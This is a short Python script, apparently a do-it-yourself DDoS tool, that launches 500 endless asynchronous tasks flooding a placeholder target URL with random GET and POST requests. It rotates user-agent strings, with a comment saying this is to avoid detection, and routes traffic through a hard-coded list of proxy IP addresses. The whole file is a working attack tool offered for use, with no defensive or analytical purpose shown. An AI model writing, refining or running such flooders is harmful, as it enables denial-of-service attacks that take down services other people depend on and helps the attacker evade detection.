import aiohttp
import asyncio
import random

# List of random user agents to avoid detection
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.1.2 Safari/602.3.12',
    # Add more user agents here
]

# Simple proxy list
proxies = [
    'http://203.130.228.60:8080',
    'http://178.62.193.19:3128',
    'http://104.248.63.17:30588',
    # Add more proxies here
]

# Asynchronous function to send requests
async def flood(session, target_url):
    while True:
        try:
            # Randomize user-agent and proxy
            headers = {'User-Agent': random.choice(user_agents)}
            proxy = random.choice(proxies)
            
            # Randomly choose GET or POST request
            if random.choice([True, False]):
                async with session.get(target_url, headers=headers, proxy=proxy) as response:
                    print(f"GET {target_url} | {response.status} | {headers['User-Agent']} via {proxy}")
            else:
                async with session.post(target_url, headers=headers, proxy=proxy, data={'key': 'value'}) as response:
                    print(f"POST {target_url} | {response.status} | {headers['User-Agent']} via {proxy}")
        except Exception as e:
            print(f"Request failed: {e}")

# Async entry point
async def main(target_url):
    async with aiohttp.ClientSession() as session:
        tasks = []
        # Launch 500 asynchronous flood tasks
        for _ in range(500):  # Adjust this based on how much Termux can handle
            tasks.append(flood(session, target_url))
        
        # Run the tasks
        await asyncio.gather(*tasks)

target_url = "http://example.com"  # Replace with your target URL

# Run the asynchronous main function
asyncio.run(main(target_url))
